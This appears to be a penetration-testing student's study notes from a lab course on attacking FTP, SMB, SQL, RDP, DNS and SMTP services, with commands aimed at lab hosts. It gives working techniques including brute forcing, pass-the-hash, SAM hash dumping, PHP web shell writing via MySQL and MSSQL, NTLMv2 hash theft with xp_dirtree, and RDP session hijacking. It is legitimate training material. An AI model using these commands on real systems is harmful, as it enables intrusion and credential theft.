
# <mark class="hltr-pink">FTP</mark>

## <mark class="hltr-cyan">Enumeration</mark>

```shell-session
sudo nmap -sC -sV -p 21 192.168.2.142 
```

## <mark class="hltr-cyan">Anonymous login</mark>

```shell-session
ftp 192.168.2.142
```

![[Pasted image 20240924113416.png]]

## <mark class="hltr-cyan">Brute Forcing</mark>

```
nxc ftp 10.129.202.222 -u john -p /usr/share/wordlists/rockyou.txt
```

---

# <mark class="hltr-pink">SMB</mark>
## <mark class="hltr-cyan">Enumeration</mark>

## <mark class="hltr-cyan">Misconfigurations</mark>

SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`. Let's explore how we can interact with file shares and RPC using null authentication.


## <mark class="hltr-cyan">File Share</mark>

```shell-session
smbmap -H 10.129.14.128
```

![[Pasted image 20240924114352.png]]

```shell-session
smbmap -H 10.129.14.128 -r notes
```

![[Pasted image 20240924114423.png]]
- Download
```shell-session
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

- Upload
```shell-session
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

## <mark class="hltr-cyan">Remote Procedure call (RPC)</mark>

```shell-session
dalichabani7academy@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers
```

```shell-session
./enum4linux-ng.py 10.10.11.45 -A -C
```

## <mark class="hltr-cyan">Protocol Specifics Attacks</mark>

### <mark class="hltr-orange">Brute Forcing</mark>

if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`.

```shell-session
nxc smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

### <mark class="hltr-orange">Administrator Access Attacks</mark>

When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:

- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

#### <mark class="hltr-grey">Remote Code Execution</mark>

To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:
```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```


Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time:
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

#### <mark class="hltr-grey">Enumerating logged on users</mark>

Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `nxc` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

```shell-session
nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Or we can enumerate logged on users on a single host:
```shell-session
nxc smb 10.10.110.4 -u administrator -p 'Password123!' --loggedon-users
```

#### <mark class="hltr-grey">Extract hashes from SAM Database</mark>

```shell-session
nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### <mark class="hltr-grey">Pass The Hash (PtH)</mark>

If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH).

```shell-session
nxc smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```


---

# <mark class="hltr-pink">SQL</mark>

## <mark class="hltr-cyan">Enumeration</mark>

By default, MSSQL uses ports <mark class="hltr-green">TCP/1433</mark> and <mark class="hltr-green">UDP/1434</mark>, and MySQL uses <mark class="hltr-green">TCP/3306</mark>. However, when MSSQL operates in a "hidden" mode, it uses the <mark class="hltr-green">TCP/2433</mark> port.

```shell-session
nmap -Pn -sV -sC -p1433 10.10.10.125
```

## <mark class="hltr-cyan">Authentication Mechanisms</mark>

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:
![[Pasted image 20240926124207.png]]

`MySQL` also supports different [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), such as username and password, as well as Windows authentication (a plugin is required).

## <mark class="hltr-cyan">Connecting to the SQL server</mark>

- MySQL
```shell-session
mysql -u julio -pPassword123 -h 10.129.20.13
```

- MSSQL
```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:

```shell-session
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`:

```shell-session
mssqlclient.py -p 1433 julio@10.129.203.7 
```

❗: When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

```shell-session
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

❗: impacket-mssqlclient.py also supports windows authentication

## <mark class="hltr-cyan">SQL Default Databases</mark>

It is essential to know the default databases for `MySQL` and `MSSQL`.
Those databases hold information about the database itself and help us enumerate database names, tables, columns, etc.


<mark class="hltr-green">MySQL</mark> default system schemas/databases:

- <mark class="hltr-green">mysql</mark> - is the system database that contains tables that store information required by the MySQL server
- <mark class="hltr-green">information_schema</mark> - provides access to database metadata
- <mark class="hltr-green">performance_schema</mark> - is a feature for monitoring MySQL Server execution at a low level
- <mark class="hltr-green">sys</mark> - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

<mark class="hltr-red">MSSQL</mark> default system schemas/databases:
- <mark class="hltr-red">master</mark> - keeps the information for an instance of SQL Server.
- <mark class="hltr-red">msdb</mark> - used by SQL Server Agent.
- <mark class="hltr-red">model</mark> - a template database copied for each new database.
- <mark class="hltr-red">resource</mark> - a read-only database that keeps system objects visible in every database on the server in sys schema.
- <mark class="hltr-red">tempdb</mark> - keeps temporary objects for SQL queries.


## <mark class="hltr-cyan">SQL Syntax</mark>

### <mark class="hltr-orange">Show Databases</mark>

#### <mark class="hltr-grey">MySQL</mark>

```shell-session
mysql> SHOW DATABASES;
```

#### <mark class="hltr-grey">MSSQL</mark>

If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

![[Pasted image 20240926130232.png]]

### <mark class="hltr-orange">Select a Database</mark>
#### <mark class="hltr-grey">MySQL</mark>

```shell-session
mysql> USE htbusers;
```

#### <mark class="hltr-grey">MSSQL</mark>

```cmd-session
1> USE htbusers
2> GO
```

### <mark class="hltr-orange">Show Tables</mark>

#### <mark class="hltr-grey">MySQL</mark>

```shell-session
mysql> SHOW TABLES;
```

#### <mark class="hltr-grey">MSSQL</mark>

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```

### <mark class="hltr-orange">Select all Data from Table</mark>

#### <mark class="hltr-grey">MySQL</mark>

```shell-session
mysql> SELECT * FROM users;
```

#### <mark class="hltr-grey">MSSQL</mark>

```cmd-session
1> SELECT * FROM users
2> go
```


### <mark class="hltr-orange">Execute Commands</mark>

If we have the <mark class="hltr-red">appropriate privileges</mark>, we can use the SQL database to execute system commands or create the necessary elements to do it.

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account

If `xp_cmdshell` is <mark class="hltr-red">not enabled</mark>, we can enable it, if we have the <mark class="hltr-red">appropriate privileges</mark>, using the following command:

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

Then we can use it to run commands

```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```


### <mark class="hltr-orange">Write Local Files</mark>

#### <mark class="hltr-grey">MySQL</mark>

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

##### <mark class="hltr-purple">MySQL - Secure File Privileges</mark>

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.


```shell-session
mysql> show variables like "secure_file_priv";
```

![[Pasted image 20240927175011.png]]

#### <mark class="hltr-grey">MSSQL</mark>

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

##### <mark class="hltr-purple">MSSQL - Enable Ole Automation Procedures</mark>

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

##### <mark class="hltr-purple">MSSQL - Create a File</mark>

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### <mark class="hltr-orange">Read Local Files</mark>

#### <mark class="hltr-grey">MySQL</mark>

By default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

```shell-session
mysql> select LOAD_FILE("/etc/passwd");
```

#### <mark class="hltr-grey">MSSQL</mark>

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

### <mark class="hltr-orange">Capture MSSQL Service Hash</mark>

We can also steal the MSSQL service account hash using <mark class="hltr-green">xp_subdirs</mark> or <mark class="hltr-green">xp_dirtree</mark> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.

When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

#### <mark class="hltr-grey">XP_DIRTREE Hash Stealing</mark>
```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

#### <mark class="hltr-grey">XP_SUBDIRS Hash Stealing</mark>
```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

#### <mark class="hltr-grey">Launching a Responder server</mark>

```shell-session
sudo responder -I tun0
```

#### <mark class="hltr-grey">Launching a server with impacket-smbserver</mark>

```shell-session
sudo impacket-smbserver share ./ -smb2support
```

#### <mark class="hltr-grey">Cracking the NTLMv2 password</mark>

Copy the NTLMv2 hash to a hashes.txt file and crack it using hashcat:

```
hashcat -m 5600 hash.txt /usr/share/wordlist/rockyou.txt
```

[Follow This Guide](https://zone13.io/cracking-ntlmv2-responses-captured-using-responder/)

❗: You can then authenticate to the sql server using windows-auth:
```
mssqlclient.py -p 1433 -windows-auth mssqlsvc@10.129.193.95
```

### <mark class="hltr-orange">Impersonate Existing Users with MSSQL</mark>

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.

First, we need to identify users that we can impersonate. <mark class="hltr-red">Sysadmins can impersonate anyone by default</mark>, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:

#### <mark class="hltr-grey">Identify Users that We Can Impersonate</mark>

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

![[Pasted image 20240927181402.png]]

#### <mark class="hltr-grey">Verifying our Current User and Role</mark>

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

![[Pasted image 20240927181415.png]]

As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user

#### <mark class="hltr-grey">Impersonating the SA User</mark>

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

![[Pasted image 20240927181628.png]]

❗: It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

### <mark class="hltr-orange">Communicate with Other Databases with MSSQL</mark>

#### <mark class="hltr-grey">Identify linked Servers in MSSQL</mark>

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO
```

![[Pasted image 20240927181809.png]]
❗: linked servers can be local

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

![[Pasted image 20240927181956.png]]

#### <mark class="hltr-grey">Example from the Hard Lab</mark>

```mssqclient
SQL (john  guest@msdb)> enum_links
```

![[Pasted image 20241003015747.png]]

❗: linked servers can be local such is the case of local.test.linked.srv


We can then check if john is an admin at local.test.linked.srv (which we can tell he is by getting 1 as an output)

```
EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [local.test.linked.srv];
```

![[Pasted image 20241003015953.png]]

We do then get file r/w permissions on local.test.linked.srv which we will use to retrieve the flag found in `C:/Users/Administrator/desktop/flag.txt`

```
execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];
```

---

# <mark class="hltr-pink">RDP</mark>

## <mark class="hltr-cyan">RDP Password Spraying</mark>

- Crowbar
```shell-session
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

- Hydra
```shell-session
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```


## <mark class="hltr-cyan">RDP Login</mark>

```
xfreerdp /v:192.168.2.143 /u:admin /p:password123 /dynamic-resolution
```

## <mark class="hltr-cyan">RDP Session Hijacking</mark>

We are logged in as the user `juurena` (UserID = 2) who has <mark class="hltr-green">Administrator</mark> privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.

![[Pasted image 20240930124835.png]]

To successfully impersonate a user without their password, we need to have <mark class="hltr-red">SYSTEM privileges</mark> and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session.
It works by specifying which <mark class="hltr-green">SESSION ID</mark> (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrator privileges, we can use several methods <mark class="hltr-red">to obtain SYSTEM privileges</mark>, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to <mark class="hltr-green">create a Windows service</mark> that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.

To run the command, we can start the `sessionhijack` service :
```cmd-session
C:\htb> net start sessionhijack
```

Once the service is started, a new terminal with the `lewen` user session will appear.

![[Pasted image 20240930125537.png]]

## <mark class="hltr-cyan">RDP Pass-the-Hash (PtH)</mark>

If we have plaintext credentials for the target user, it will be no problem to RDP into the system. However, what if we only have the NT hash of the user obtained from a credential dumping attack such as [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) database, and we could not crack the hash to reveal the plaintext password? In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

<mark class="hltr-green">Restricted Admin Mode</mark>, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
![[Pasted image 20240930125820.png]]

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

```shell-session
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

---

# <mark class="hltr-pink">DNS</mark>

## <mark class="hltr-cyan">DNS Zone Transfer</mark>

Remember to add ns1.inlanefreight.htb to the /etc/hosts file

```shell-session
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

```
dig axfr @ns1.inlanefreight.htb helpdesk.inlanefreight.htb
```

## <mark class="hltr-cyan">Subdomain Enumeration</mark>

```shell-session
cd ~/tools/subbrute
echo "ns.inlanefreight.htb" > resolv.txt
python3 subbrute.py inlanefreight.htb -s ./names.txt -r ./resolv.txt
```

## <mark class="hltr-cyan">Lab walkthrough</mark>

```
nmap -p53 10.129.203.6 
```

We can see that TCP port 53 is open

Then we proceed to query the server for records of the inlanefreight.htb domains

```
dig any @10.129.203.6 inlanefreight.htb
```

![[Pasted image 20240930214309.png]]

We should then add <mark class="hltr-green">ns.inlanefreight.htb</mark> to the /etc/hosts file.

We proceed to do a subdomain enumeration using subbrute

```
echo "ns.inlanefreight.htb > resolv.txt"
pytho3 subbrute.py inlanefreight.htb -s names_small.txt -r resolv.txt
```

![[Pasted image 20240930215240.png]]

We can then try to do a zone transfer for the hr.inlanefreight.htb to get more informations (On this lab there are more subdomains like contact.inlanefreight.htb and helpdesk.inlanefreight.htb but zone transfer only works on hr)

```
dig axfr @ns.inlanefreight.htb hr.inlanefreight.htb
```

![[Pasted image 20240930215550.png]]

---


# <mark class="hltr-pink">SMTP</mark>

![[Pasted image 20241004123926.png]]

## <mark class="hltr-cyan">SMTP User Enumeration</mark>

```shell-session
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## <mark class="hltr-cyan">Password Attacks</mark>


```shell-session
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

